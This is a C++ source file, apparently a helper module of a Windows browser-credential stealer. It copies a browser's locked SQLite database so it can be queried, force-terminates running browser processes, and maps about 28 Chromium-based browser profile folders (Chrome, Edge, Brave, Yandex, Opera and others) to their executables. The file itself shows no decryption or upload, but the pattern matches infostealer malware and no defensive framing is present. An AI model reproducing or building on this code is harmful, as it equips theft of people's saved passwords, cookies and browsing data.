#include "includes/Helper.h"

BOOL custom_copy_file(const std::string& sourceFile, const std::string& destinationFile) {
	std::ifstream source(sourceFile, std::ios::binary);
	if (!source) {
		return false;
	}

	std::ofstream dest(destinationFile, std::ios::binary);
	if (!dest) {
		return false;
	}

	dest << source.rdbuf();

	if (!dest.good()) {
		return false;
	}

	//std::cout << "File copied successfully." << std::endl;
	return true;
}

sqlite3_stmt* query_database(std::string target_data, const char* database_query)
{
	sqlite3* db;
	if (sqlite3_open(target_data.c_str(), &db) == SQLITE_OK)
	{
		//std::cout << "file found" << std::endl;
		sqlite3_stmt* stmt = nullptr;
		if (sqlite3_prepare_v2(db, database_query, -1, &stmt, 0) == SQLITE_OK)
		{
			return stmt;
		}
		else
		{
			//std::cerr << "Database file in use .... " << std::endl;
			std::string new_target = target_data + " copy";
			custom_copy_file(target_data, new_target);

			sqlite3_open(new_target.c_str(), &db);
			if (sqlite3_prepare_v2(db, database_query, -1, &stmt, 0) == SQLITE_OK)
			{
				return stmt;
			}
			else
			{
				//std::cerr << "Failed to prepare statement: " << sqlite3_errmsg(db) << std::endl;
				return stmt;
			}
		}
	}
	return nullptr;
}

BOOL kill_process(std::string process_path)
{
	std::string process_name = GetBrowserProcessName(process_path);

	if (process_name == "")
		return false;

	// Convert std::string to LPCWSTR (wide string)
	std::wstring wProcessName(process_name.begin(), process_name.end());

	// Get a snapshot of all processes in the system
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		//std::cerr << "Failed to create snapshot." << std::endl;
		return false;
	}

	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32);

	// Retrieve information about the first process
	if (!Process32First(hSnapshot, &processEntry)) {
		//std::cerr << "Failed to retrieve process information." << std::endl;
		CloseHandle(hSnapshot);
		return false;
	}

	// Iterate through all processes in the snapshot
	do {
		if (!_wcsicmp(processEntry.szExeFile, wProcessName.c_str())) {
			// Open the process with terminate rights
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processEntry.th32ProcessID);
			if (hProcess != NULL) {
				// Terminate the process
				if (TerminateProcess(hProcess, 0)) {
					continue;
				}
				else {
					//std::cerr << "Failed to terminate process: " << process_name << " (PID: " << processEntry.th32ProcessID << ")" << std::endl;
					continue;
				}
				CloseHandle(hProcess);
			}
			else {
				//std::cerr << "Failed to open process: " << process_name << " (PID: " << processEntry.th32ProcessID << ")" << std::endl;
				continue;
			}
		}
	} while (Process32Next(hSnapshot, &processEntry));

	CloseHandle(hSnapshot);
	return true;
}

std::string GetBrowserProcessName(const std::string& browserFolder) {
	// Map to associate browser folder paths with their process names
	static std::map<std::string, std::string> browserProcessMap = {
		{"Microsoft\\Edge\\", "msedge.exe"},
		{"Google\\Chrome\\", "chrome.exe"},
		{"Opera Software\\Opera Stable", "opera.exe"},
		{"Iridium\\", "iridium.exe"},
		{"Chromium\\", "chromium.exe"},
		{"BraveSoftware\\Brave-Browser\\", "brave.exe"},
		{"CentBrowser\\", "centbrowser.exe"},
		{"Chedot\\", "chedot.exe"},
		{"Orbitum\\", "orbitum.exe"},
		{"Comodo\\Dragon\\", "dragon.exe"},
		{"Yandex\\YandexBrowser\\", "browser.exe"},
		{"7Star\\7Star\\", "7star.exe"},
		{"Torch\\", "torch.exe"},
		{"MapleStudio\\ChromePlus\\", "chromeplus.exe"},
		{"Komet\\", "komet.exe"},
		{"Amigo\\", "amigo.exe"},
		{"Sputnik\\Sputnik\\", "sputnik.exe"},
		{"CatalinaGroup\\Citrio\\", "citrio.exe"},
		{"360Chrome\\Chrome\\", "360chrome.exe"},
		{"uCozMedia\\Uran\\", "uran.exe"},
		{"liebao\\", "liebao.exe"},
		{"Elements Browser\\", "elementsbrowser.exe"},
		{"Epic Privacy Browser\\", "epic.exe"},
		{"CocCoc\\Browser\\", "browser.exe"},
		{"Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer", "sleipnir.exe"},
		{"QIP Surf\\", "qipsurf.exe"},
		{"Coowon\\Coowon\\", "coowon.exe"},
		{"Vivaldi\\", "vivaldi.exe"}
	};

	// Find the process name in the map
	auto it = browserProcessMap.find(browserFolder);
	if (it != browserProcessMap.end()) {
		return it->second;
	}
	else {
		return "";
	}
}